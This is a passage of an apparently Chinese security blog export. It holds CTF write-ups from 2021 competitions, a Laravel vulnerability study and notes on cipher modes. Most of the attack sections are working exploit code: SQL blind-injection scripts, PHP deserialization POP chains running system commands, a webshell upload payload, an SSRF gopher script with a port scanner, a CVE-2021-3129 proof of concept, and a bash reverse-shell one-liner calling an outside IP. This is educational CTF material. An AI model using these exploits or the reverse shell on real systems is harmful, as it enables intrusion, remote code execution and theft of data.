全称为密文反馈模式（Cipher feedback）。明文分组和密文分组之间并没有经过加密这一步骤，只有一个XOR。 重放攻击 OFBFB 全称为输出反馈模式（Output feedback），其反馈内容是分组加密后的内容而不是密文加密解密 CTR CTR 模式全称是CounTeR模式(计数器模式)，CTR模式是一种通过将逐次累积的计数器进行加密来生成密钥流的流密码。 加密解密 参考文章DES加密算法原理:whttps://www.jianshu.com/p/c44a8a1b7c38DES加密算法分析:http://ronpa.top/2018/08/20/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/AES 加密算法的原理详解：https://blog.csdn.net/gulang03/article/details/81175854ctfwiki:https://ctf-wiki.org/crypto/blockcipher/mode/introduction/","categories":[],"tags":[],"author":"ye1s"},{"title":"2021年比赛题目集合","slug":"2021年比赛题目集合","date":"2021-01-17T08:33:00.000Z","updated":"2021-06-12T15:32:33.903Z","comments":true,"path":"article/2bc9e6ed.html","link":"","permalink":"https://blog.cfyqy.com/article/2bc9e6ed.html","excerpt":"2021年参加过的比赛题目","text":"2021年参加过的比赛题目 星 CTFoh-my-note题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131import stringimport randomimport timeimport datetimefrom flask import render_template, redirect, url_for, request, session, Flaskfrom functools import wrapsfrom exts import dbfrom config import Configfrom models import User, Notefrom forms import CreateNoteFormapp = Flask(__name__)app.config.from_object(Config)db.init_app(app)def login_required(f): @wraps(f) def decorated_function(*args, **kws): if not session.get(\"username\"): return redirect(url_for('index')) return f(*args, **kws) return decorated_functiondef get_random_id(): alphabet = list(string.ascii_lowercase + string.digits) return ''.join([random.choice(alphabet) for _ in range(32)])@app.route('/')@app.route('/index')def index(): results = Note.query.filter_by(prv='False').limit(100).all() notes = [] for x in results: note = &#123;&#125; note['title'] = x.title note['note_id'] = x.note_id notes.append(note) return render_template('index.html', notes=notes)@app.route('/logout')@login_requireddef logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/create_note', methods=['GET', 'POST'])def create_note(): try: form = CreateNoteForm() if request.method == \"POST\": username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session['username'] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC') random.seed(user_id + post_at) note_id = get_random_id() note = Note(user_id=user_id, note_id=note_id, title=title, text=text, prv=prv, post_at=post_at) db.session.add(note) db.session.commit() return redirect(url_for('index')) else: return render_template(\"create.html\", form=form) except Exception as e: pass@app.route('/my_notes')def my_notes(): if session.get('username'): username = session['username'] user_id = User.query.filter_by(username=username).first().user_id else: user_id = request.args.get('user_id') if not user_id: return redirect(url_for('index')) results = Note.query.filter_by(user_id=user_id).limit(100).all() notes = [] for x in results: note = &#123;&#125; note['title'] = x.title note['note_id'] = x.note_id notes.append(note) return render_template(\"my_notes.html\", notes=notes)@app.route('/view/&lt;_id&gt;')def view(_id): note = Note.query.filter_by(note_id=_id).first() user_id = note.user_id username = User.query.filter_by(user_id=user_id).first().username data = &#123; 'post_at': note.post_at, 'title': note.title, 'text': note.text, 'username': username &#125; return render_template('note.html', data=data)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) 通过Note知道有admin账户，且发送着条消息的时间通过代码可知，可以通过该消息的时间上下波动，来爆破user_id，爆破的条件判断为node_id,可以该消息的链接里得知 1http://52.163.52.206:5002/view/lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u 需注意时间为 UTC，这里还需加8小时 exp 123456789101112131415161718192021222324252627282930313233import randomimport stringimport timedef get_random_id(): alphabet = list(string.ascii_lowercase + string.digits) return ''.join([random.choice(alphabet) for _ in range(32)])def get_user_id(timestamp): random.seed(timestamp) user_id = get_random_id() return user_iddef time_data(time_sj): data_sj = time.strptime(time_sj,\"%Y-%m-%d %H:%M:%S\") time_int = int(time.mktime(data_sj)) return time_intdef is_admin(user_id): post_at='2021-01-15 02:29 UTC' random.seed(user_id+post_at) note_id=get_random_id() if note_id =='lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u': print(user_id) exit()if __name__=='__main__': base_time = time_data(\"2021-01-15 10:29:00\") all_args = [] for i in range(0, 60): for j in range(0, 10000): timestamp = str(base_time + i) + \".\" + str(j).zfill(4) user_id = get_user_id(float(timestamp)) is_admin(user_id) 红明谷write_shell123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i\",$input))&#123; // if(preg_match(\"/'| |_|=|php/\",$input))&#123; die('hacker!!!'); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[\"action\"] ?? \"\") &#123; case 'pwd': echo $dir; break; case 'upload': $data = $_GET[\"data\"] ?? \"\"; waf($data); file_put_contents(\"$dir\" . \"index.php\", $data);&#125;?&gt; 解答 1?action=upload&amp;data=&lt;?=`cat%09/!*` ?&gt; easytp参考链接：https://f5.pm/go-53579.html 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?phpnamespace Think\\Db\\Driver&#123;use PDO;class Mysql&#123;protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件);protected $config = array(\"debug\" =&gt; 1,\"database\" =&gt; \"thinkphp3\",\"hostname\" =&gt; \"localhost\",\"hostport\" =&gt; \"3306\",\"charset\" =&gt; \"utf8\",\"username\" =&gt; \"admin\",\"password\" =&gt; \"123456\");&#125;&#125;namespace Think\\Image\\Driver&#123;use Think\\Session\\Driver\\Memcache;class Imagick&#123;private $img;public function __construct()&#123; $this-&gt;img = new Memcache();&#125;&#125;&#125;namespace Think\\Session\\Driver&#123;use Think\\Model;class Memcache&#123;protected $handle;public function __construct()&#123; $this-&gt;handle = new Model();&#125;&#125;&#125;namespace Think&#123;use Think\\Db\\Driver\\Mysql;class Model&#123;protected $options = array();protected $pk;protected $data = array();protected $db = null;public function __construct()&#123; $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array(\"table\" =&gt; \"mysql.user where 1=updatexml(1,database(),1)#\",\"where\" =&gt; \"1=1\");&#125;&#125;&#125;namespace &#123;#echo serialize(new Think\\Image\\Driver\\Imagick());echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; happysql参考红明谷 http://www.plasf.cn/articles/hongmingguctf.html 简单fuzz发现过滤了if,空格、or,and,information,单引号,benchmark,sleep，=，li k,+,-等关键字 但是双引号并未过滤。正好题目也是由双引号包裹的字符串，同时#也没有过滤可以顺利逃逸出来 or和and 等逻辑运算符直接用||代替即可。等于号可以使用regexp或者strcmp,而字符串分割可以使用locate代替。||只要一边执行成功就能跳转到home.php if使用make_set 由于information被过滤使用mysql.innodb_index_stats代替发现可以 123456789101112131415161718192021222324252627import osimport requestsimport stringurl = \"xxxxxxxx\"req = requests.session()string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']res = ''chars = string.printableresult = \"\"for i in range(1,45): for j in chars: data = &#123; #'username':'a\"||exp(make_set(strcmp((locate(binary\"%s\",(select/**/database()),%d)),%d),710,1))#'%(j,i,i), #数据库 # 'username':'a\"||exp(make_set(strcmp((locate(binary\"%s\",(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/\"ctf\"),%d)),%d),710,1))#'%(j,i,i),#表 'username':'a\"||exp(make_set(strcmp((locate(binary\"%s\",(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#'%(j,i,i), 'password':'213' &#125; rep = req.post(url,data) text = rep.text if 'home.php' in text: result += j print(result) break 虎符杯日志sql时间盲注日志脚本 12345678910111213import reresult=\"\"with open('access.log',\"r\") as f: lines=f.readlines() for i in range(1,len(lines)): pre=re.findall(\"2021:18:(\\d&#123;2,2&#125;):(\\d&#123;2,2&#125;)\",lines[i-1])[0][1] aft=re.findall(\"2021:18:(\\d&#123;2,2&#125;):(\\d&#123;2,2&#125;)\",lines[i])[0][1] time=int(aft)-int(pre) # print(time) if time&gt;=2: flag=re.findall(\"=(\\d&#123;0,3&#125;),sleep\", lines[i-1])[0] result =result+chr(int(flag)) print(result) 签到1User-Agentt:zerodiumsystem(\"cat /flag\"); unsetme通过题目给的源码得知是 fat-free 框架，去官网下载一个非最新版本的源码。https://fatfreeframework.com/3.6/home 修改index.php文件，搭建好直接访问，报了/lib/base.php的eval 错误，跟进此文件，可以知道eval这里存在利用点，$val由@hive连接$key,进入compile函数再将$hive 替换为$this-&gt;hive。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function clear($key) &#123; // Normalize array literal $cache=Cache::instance(); $parts=$this-&gt;cut($key); if ($key=='CACHE') // Clear cache contents $cache-&gt;reset(); elseif (preg_match('/^(GET|POST|COOKIE)\\b(.+)/',$key,$expr)) &#123; $this-&gt;clear('REQUEST'.$expr[2]); if ($expr[1]=='COOKIE') &#123; $parts=$this-&gt;cut($key); $jar=$this-&gt;hive['JAR']; unset($jar['lifetime']); $jar['expire']=0; if (version_compare(PHP_VERSION, '7.3.0') &gt;= 0) &#123; $jar['expires']=$jar['expire']; unset($jar['expire']); setcookie($parts[1],NULL,$jar); &#125; else &#123; unset($jar['samesite']); call_user_func_array('setcookie', array_merge([$parts[1],NULL],$jar)); &#125; unset($_COOKIE[$parts[1]]); &#125; &#125; elseif ($parts[0]=='SESSION') &#123; if (!headers_sent() &amp;&amp; session_status()!=PHP_SESSION_ACTIVE) session_start(); if (empty($parts[1])) &#123; // End session session_unset(); session_destroy(); $this-&gt;clear('COOKIE.'.session_name()); &#125; $this-&gt;sync('SESSION'); &#125; if (!isset($parts[1]) &amp;&amp; array_key_exists($parts[0],$this-&gt;init)) // Reset global to default value $this-&gt;hive[$parts[0]]=$this-&gt;init[$parts[0]]; else &#123; $val=preg_replace('/^(\\$hive)/','$this-&gt;hive', $this-&gt;compile('@hive.'.$key, FALSE)); eval('unset('.$val.');');//触发点 if ($parts[0]=='SESSION') &#123; session_commit(); session_start(); &#125; if ($cache-&gt;exists($hash=$this-&gt;hash($key).'.var')) // Remove from cache $cache-&gt;clear($hash); &#125; $key可以寻到__unset这个魔术方法，当在类外部执行unset()函数时，自动执行类内__unset()魔术方法。 123function __unset($key) &#123; $this-&gt;offsetunset($key);&#125; 所以$key是我们可控的，也就是$_GET[&#39;a&#39;]的值，接下来就是$this-&gt;compile该函数的的作用了。跟进compile中，$evaluate为false，所以进入第一部分。这里调用了两次preg_replace_callback，第一次匹配到hive在其前面添加$，第二次匹配传入的字符串，并用[&#39; &#39;]包裹，然而[]不会被匹配，所以可以写入一个二维数组来绕过。 12345678910111213141516171819202122function compile($str, $evaluate=TRUE) &#123; return (!$evaluate) ? preg_replace_callback( '/^@(\\w+)((?:\\..+|\\[(?:(?:[^\\[\\]]*|(?R))*)\\])*)/', function($expr) &#123; $str='$'.$expr[1]; if (isset($expr[2])) $str.=preg_replace_callback( '/\\.([^.\\[\\]]+)|\\[((?:[^\\[\\]\\'\"]*|(?R))*)\\]/', function($sub) &#123; $val=isset($sub[2]) ? $sub[2] : $sub[1]; if (ctype_digit($val)) $val=(int)$val; $out='['.$this-&gt;export($val).']'; return $out; &#125;, $expr[2] ); return $str; &#125;, $str ) 二维数组可以在hive的属性里找，最后 1?a=CORS[headers]);system(%27cat%20/flag%27 津门杯power_cut根据题目断电和14级大风，就猜测有.index.php.swp文件，当我们编辑文件时候，突然断电，或者突然断网，为了防止数据丢失，会出现这种文件。 vi -r index.php.swp 可看文件内容 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpclass logger&#123; public $logFile; public $initMsg; public $exitMsg; function __construct($file)&#123; // initialise variables $this-&gt;initMsg=\"#--session started--#\\n\"; $this-&gt;exitMsg=\"#--session end--#\\n\"; $this-&gt;logFile = $file; readfile($this-&gt;logFile); &#125; function log($msg)&#123; $fd=fopen($this-&gt;logFile,\"a+\"); fwrite($fd,$msg.\"\\n\"); fclose($fd); &#125; function __destruct()&#123; echo \"this is destruct\"; &#125;&#125;class weblog &#123; public $weblogfile; function __construct() &#123; $flag=\"system('cat /flag')\"; echo \"$flag\"; &#125; function __wakeup()&#123; // self::waf($this-&gt;filepath); $obj = new logger($this-&gt;weblogfile); &#125; public function waf($str)&#123; $str=preg_replace(\"/[&lt;&gt;*#'|?\\n ]/\",\"\",$str); $str=str_replace('flag','',$str); return $str; &#125; function __destruct()&#123; echo \"this is destruct\"; &#125;&#125;$log = $_GET['log'];$log = preg_replace(\"/[&lt;&gt;*#'|?\\n ]/\",\"\",$log);$log = str_replace('flag','',$log);$log_unser = unserialize($log);?&gt; 容易找到利用链，直接读flag,这里使用str_replace(‘flag’,’’,$log)过滤，只过滤了一次，可双写绕过。这里记得将序列化后的字符串的字符长度修改为5exp 12345678910111213141516171819202122232425262728&lt;?phpclass logger&#123; public $logFile; public $initMsg; public $exitMsg;&#125;class weblog &#123; public $weblogfile=\"/flflagag\"; function __wakeup()&#123; // self::waf($this-&gt;filepath); $obj = new logger($this-&gt;weblogfile); &#125; function __destruct()&#123; echo \"this is destruct\"; &#125;&#125;$web=new weblog();echo serialize($web);#O:6:\"weblog\":1:&#123;s:10:\"weblogfile\";s:5:\"/flflagag\";&#125;?&gt; hate_phpphp5.6无法使用反转，使用通配符即可 1234567891011&lt;?phperror_reporting(0);if(!isset($_GET['code']))&#123; highlight_file(__FILE__);&#125;else&#123; $code = $_GET['code']; if(preg_match(\"/[A-Za-z0-9_$@]+/\",$code))&#123; die('fighting!'); &#125; eval($code);&#125; payload 1?code=?&gt;&lt;?=`/???/??? /????`?&gt; uploadhub12345678&lt;Files ~ \"^.ht\"&gt; Require all granted Order allow,deny Allow from all php_flag engine on&lt;/Files&gt;SetHandler application/x-httpd-php# &lt;?php echo 1; readfile(\"/flag\"); ?&gt; easysql1234567891011121314151617181920&lt;?phphighlight_file(__FILE__);session_start();$url = $_GET['url'] ?? false;if($url)&#123; $a = preg_match(\"/file|dict/i\", $url); if ($a==1) &#123; exit(); &#125; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[\"url\"]); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch);&#125;?&gt; SSRF 禁用了 file和dict协议 端口扫描 123456789101112131415import requestsport = list()url = \"http://121.36.147.29:20001/?url=127.0.0.1:&#123;&#125;\"for i in range(65536): url_tmp = url.format(i) try: req = requests.get(url=url_tmp, timeout=2) if len(req.content) &gt; 3391: port.append(i) print(i) except: passprint(\"开放端口\", port) 80、3306 -目录扫描 12200 http:&#x2F;&#x2F;121.36.147.29:20001&#x2F;index.php200 http:&#x2F;&#x2F;121.36.147.29:20001&#x2F;admin.php 访问 admin.php，出现302跳转 123456789101112131415161718HTTP/1.1 302 FoundDate: Mon, 10 May 2021 03:44:44 GMTServer: Apache/2.4.18 (Ubuntu)Location: index.phpContent-Length: 521Connection: closeContent-Type: text/html; charset=UTF-8&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;SQL&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"#FFFFFF\"&gt;&lt;div style=\" margin-top:60px;color:#FFF; font-size:23px; text-align:center\"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=\"#FF0000\"&gt; my dear admin, posting your \"poc\" please~ &lt;/font&gt;&lt;br&gt;&lt;font size=\"3\" color=\"#FFFF00\"&gt; 结合前面的ssrf 1http:&#x2F;&#x2F;121.36.147.29:20001&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1:80&#x2F;admin.php 1my dear admin, posting your &quot;poc&quot; please~ 时间盲注脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import urllib.parseimport requestsimport stringimport time# --------------*****配置信息******-------------------ssrf_url = \"http://121.36.147.29:20001/?url=\" # 存在ssrf的urlinner_host = \"127.0.0.1:80\" # 通过ssrf要访问到的主机inner_page = \"admin.php\" # 通过ssrf要访问到的页面# payload = \"code=phpinfo();\" # 执行的payload# payload_len = len(payload)gopher_method = \"POST\" # gopher包的请求方法，只能是POST和GET# gopher包的头部需要进行1次URL编码，防止在首次http请求中存在干扰字符，注：gopher默认端口是70，所以80端口需要带上gopher_header = urllib.parse.quote(\"gopher://127.0.0.1:80/_\")def gen_ssrf_post(): # gopher包至少包括Host、Content-Length、Content-Type三个头部 # 需要进行2次URL编码，当服务器接收到ssrf页面的GET请求是会进行一次URL解码 # 这里的换行符不支持\\n，而是要用\\r\\n gopher = '''POST /&#123;&#125; HTTP/1.1\\r\\nHost: &#123;&#125;\\r\\nContent-Length: &#123;&#125;\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\n&#123;&#125;''' exp = gopher.format(inner_page, inner_host, str(payload_len), payload) return expdef gen_payload(): if gopher_method == \"POST\": payload = gen_ssrf_post() else: payload = gen_ssrf_get() print(payload) payload = urllib.parse.quote(urllib.parse.quote(payload)) payload = gopher_header + payload return payload# --------------*****发送请求******-------------------result = ''for i in range(1, 100): for c in string.printable: payload = '''poc=if((ord(substr((select/**/flag/**/from/**/flag),&#123;0&#125;,1))=ord('&#123;1&#125;')),sleep(1),0)'''.format(i, 'f') payload_len = len(payload) exp = gen_payload() url = ssrf_url + exp print(url) time_start = time.time() s = requests.get(url=url) time_end = time.time() if time_end - time_start &gt; 1: result += c print(c)print(result) 陇警杯login ad adminsql注入的用户名密码，登入即可得flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phperror_reporting(0);require_once 'libs/mysql_config.php';require_once 'libs/flag.php';function sqlWaf($s)&#123; if (preg_match('/sqlmap/i', $_SERVER['HTTP_USER_AGENT'])) die; $filter = '/xml|extractvalue|regexp|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\\\"|\\^|\\||\\ /i'; if (preg_match($filter,$s)) return False; return True;&#125;function alertMes($mes,$url)&#123; echo \"&lt;script&gt;alert('&#123;$mes&#125;');location.href='&#123;$url&#125;';&lt;/script&gt;\"; die;&#125;if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; $username = strval($_POST['username']); $password = strval($_POST['password']); if ($username !== 'admin') &#123; alertMes(\"you must be admin\" ,\"./index.php\"); &#125; if ( !sqlWaf($password) ) alertMes('damn hacker' ,\"./index.php\"); $password = preg_replace('/select/i', '', $password); $sql = \"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'\"; echo \"&lt;!-- \" . $sql . \"--&gt; \"; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; $row = $result-&gt;fetch_assoc(); if ( $row['username'] === 'admin' &amp;&amp; $row['password'] ) &#123; if ($row['password'] == $password) &#123; alertMes(\"Login success:\".$FLAG ,\"./index.php\"); &#125; else &#123; alertMes(\"Sorry, I haven't let you login\" ,\"./index.php\"); &#125; &#125; &#125; else &#123; alertMes(\"Wrong Username or Password\", './index.php'); &#125;&#125;?&gt; 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsimport timefrom functools import wrapsdef spend_time(func): @wraps(func) def wrapper(*agrs, **kwargs): startTime = time.time() func(*agrs, **kwargs) endTime = time.time() sumTime = endTime - startTime print(\"spend time:\", sumTime) return wrapperdef and_operation(): url = \"http://172.16.9.2:9006/index.php\" flag_payload = \"1'/**/or/**/if((ascii(substr(password,&#123;0&#125;,1))&amp;&#123;1&#125;),sleep(2),1)/**/#\" info = \"\" for j in range(1, 33): value = 0 for k in range(7): payload = flag_payload.format(j, 2 ** k) data = &#123; \"username\": \"admin\", \"password\": payload &#125; start_time=time.time() res = requests.post(url=url, data=data) end_time=time.time() spend_time=end_time-start_time if spend_time&gt;2: value = value + (2 ** k) if value == 0: break info = info + chr(value) print(info)if __name__ == \"__main__\": and_operation() 强网杯Hard_Penetration12echo \"bash -i &gt;&amp; /dev/tcp/58.240.236.232/1234 0&gt;&amp;1\" &gt;../../../../../../tmp/123.bashbash /tmp/123.bash","categories":[],"tags":[],"author":"ye1s"},{"title":"Laravel漏洞学习","slug":"Laravel","date":"2021-01-14T01:13:56.000Z","updated":"2021-01-24T09:34:23.467Z","comments":true,"path":"article/d1159936.html","link":"","permalink":"https://blog.cfyqy.com/article/d1159936.html","excerpt":"laravel漏洞学习","text":"laravel漏洞学习 安装 1composer create-project laravel/laravel laravel57 \"5.7.*\" Laravel5.7反序列化漏洞详情可看此文章：https://xz.aliyun.com/t/5911https://www.cnblogs.com/tr1ple/p/11079354.html 漏洞描述： Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。Illuminate是其中的一个组件。Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码。 假设存在以下二次开发漏洞点：在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器，代码如下： 12345678910111213141516171819&lt;?php namespace App\\Http\\Controllers;use Illuminate\\Http\\Request;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return \"Welcome to laravel5.7\"; &#125;&#125; 在 laravel57/routes/web.php 文件中添加一条路由，便于我们后续访问 1Route::get('/',\"DemoController@Demo\"); exp 放在public文件夹下执行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace Illuminate\\Foundation\\Testing&#123; class PendingCommand&#123; protected $command; protected $parameters; protected $app; public $test; public function __construct($command, $parameters,$class,$app)&#123; $this-&gt;command = $command; $this-&gt;parameters = $parameters; $this-&gt;test=$class; $this-&gt;app=$app; &#125; &#125;&#125;namespace Illuminate\\Auth&#123; class GenericUser&#123; protected $attributes; public function __construct(array $attributes)&#123; $this-&gt;attributes = $attributes; &#125; &#125;&#125;namespace Illuminate\\Foundation&#123; class Application&#123; protected $hasBeenBootstrapped = false; protected $bindings; public function __construct($bind)&#123; $this-&gt;bindings=$bind; &#125; &#125;&#125;namespace&#123; $genericuser = new Illuminate\\Auth\\GenericUser(array(\"expectedOutput\"=&gt;array(\"0\"=&gt;\"1\"),\"expectedQuestions\"=&gt;array(\"0\"=&gt;\"1\"))); $application = new Illuminate\\Foundation\\Application(array(\"Illuminate\\Contracts\\Console\\Kernel\"=&gt;array(\"concrete\"=&gt;\"Illuminate\\Foundation\\Application\"))); $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand(\"system\",array('id'),$genericuser,$application); echo urlencode(serialize($pendingcommand));&#125;?&gt; Laravel5.8.x反序列化POP链exp1:详情可看 https://xz.aliyun.com/t/6059 在 laravel58/routes/web.php 文件添加路由 1Route::get(\"/\",\"\\App\\Http\\Controllers\\DemoController@demo\"); 在 laravel58/app/Http/Controllers/ 下添加 DemoController.php 控制器 1234567891011121314151617&lt;?phpnamespace App\\Http\\Controllers;class DemoController extends Controller&#123; public function demo() &#123; if(isset($_GET['c']))&#123; $code = $_GET['c']; unserialize($code); &#125; else&#123; highlight_file(__FILE__); &#125; return \"Welcome to laravel5.8\"; &#125;&#125; exp1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpnamespace PhpParser\\Node\\Scalar\\MagicConst&#123; class Line &#123;&#125;&#125;namespace Mockery\\Generator&#123; class MockDefinition &#123; protected $config; protected $code; public function __construct($config, $code) &#123; $this-&gt;config = $config; $this-&gt;code = $code; &#125; &#125;&#125;namespace Mockery\\Loader&#123; class EvalLoader&#123;&#125;&#125;namespace Illuminate\\Bus&#123; class Dispatcher &#123; protected $queueResolver; public function __construct($queueResolver) &#123; $this-&gt;queueResolver = $queueResolver; &#125; &#125;&#125;namespace Illuminate\\Foundation\\Console&#123; class QueuedCommand &#123; public $connection; public function __construct($connection) &#123; $this-&gt;connection = $connection; &#125; &#125;&#125;namespace Illuminate\\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; public function __construct($events, $event) &#123; $this-&gt;events = $events; $this-&gt;event = $event; &#125; &#125;&#125;namespace&#123; $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,'&lt;?php phpinfo();?&gt;'); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,'load')); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast));&#125;?&gt; exp2:这条链来自前一阵CTF国赛某道题目。漏洞存在symfony组件中（影响至罪行4.4.x-dev 版本），而默认安装的 laravel5.8 框架没有包含该组件。为了复现该漏洞，我们需要将composer.json 文件中的 require添加 &quot;symfony/symfony&quot;: &quot;4.*&quot;并执行 composer update命令即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpnamespace Symfony\\Component\\Cache&#123; final class CacheItem &#123; protected $expiry; protected $poolHash; protected $innerItem; public function __construct($expiry, $poolHash, $command) &#123; $this-&gt;expiry = $expiry; $this-&gt;poolHash = $poolHash; $this-&gt;innerItem = $command; &#125; &#125;&#125;namespace Symfony\\Component\\Cache\\Adapter&#123; class ProxyAdapter &#123; private $poolHash; private $setInnerItem; public function __construct($poolHash, $func) &#123; $this-&gt;poolHash = $poolHash; $this-&gt;setInnerItem = $func; &#125; &#125; class TagAwareAdapter &#123; private $deferred = []; private $pool; public function __construct($deferred, $pool) &#123; $this-&gt;deferred = $deferred; $this-&gt;pool = $pool; &#125; &#125;&#125;namespace &#123; $cacheitem = new Symfony\\Component\\Cache\\CacheItem(1,1,\"whoami\"); $proxyadapter = new Symfony\\Component\\Cache\\Adapter\\ProxyAdapter(1,'system'); $tagawareadapter = new Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter(array($cacheitem),$proxyadapter); echo urlencode(serialize($tagawareadapter));&#125; Laravel 5.8 SQL 注入漏洞Laravel 5.8.5以下版本https://xz.aliyun.com/t/5331 数据库添加 12345678910create table users(id int auto_increment,username varchar(250),password varchar(250),level int,primary key(id));insert into users values(1,'admin','admin',1);insert into users values(2,'user','123456',2);insert into users values(3,'aaa','bbb',3); Laravel &lt;= 8.4.2 Debug模式 _ignition远程代码执行漏洞详细文章：https://whoamianony.top/2021/01/15/lou-dong-fu-xian/laravel/laravel-debug-mode-rce-cve-2021-3129-li-yong-fu-xian/ 当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。 123456789git clone https://github.com/laravel/laravel.gitcd laravelgit checkout e849812composer installcomposer require facade/ignition==2.5.1将.env.example修改为.envphp artisan key:generatephp artisan serve --host=0.0.0.0 poc 123456789101112POST /_ignition/execute-solution HTTP/1.1Host: localhost:8000Content-Type: application/jsonContent-Length: 168&#123; \"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": &#123; \"variableName\": \"username\", \"viewFile\": \"xxxxxxx\"//phar文件位置 &#125;&#125; Laravel cookieLaravel发布安全更新，其中指出使用cookie session driver的应用受到漏洞影响，该漏洞会导致rce。https://blog.laravel.com/laravel-cookie-security-releaseshttp://x2y.pw/2020/08/06/Laravel-Cookie-Security%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/影响版本：&lt; v6.18.27，&lt; v7.22.0 漏洞比较鸡肋，限制条件较多 需要开启cookie session driver，默认是file driver 需要开发者特定的漏洞代码 cookie(‘key’, $value ，value的值完全可控 反序列化调用链 参考文章Laravel5.7反序列化漏洞之RCE链挖掘Laravel5.8.x反序列化POP链","categories":[],"tags":[],"author":"ye1s"},{"title":"信安技术文章搜索引擎使用指南","slug":"信安技术文章搜索引擎使用指南","date":"2021-01-12T05:41:21.000Z","updated":"2021-01-13T02:06:24.277Z","comments":true,"path":"article/7b1c7182.html","link":"","permalink":"https://blog.cfyqy.com/article/7b1c7182.html","excerpt":"信安技术文章搜索引擎使用指南","text":"信安技术文章搜索引擎使用指南 主界面主界面包括最近文章、漏洞通告、威胁情报、安全资讯、站点收录、数据详情等功能模块。最近文章：显示最近五天发布的安全技术文章，默认每页显示7条，可通过下方的调整框来调整大小，每页显示的最大值为50条。漏洞通告：这里只显示 CNNVD 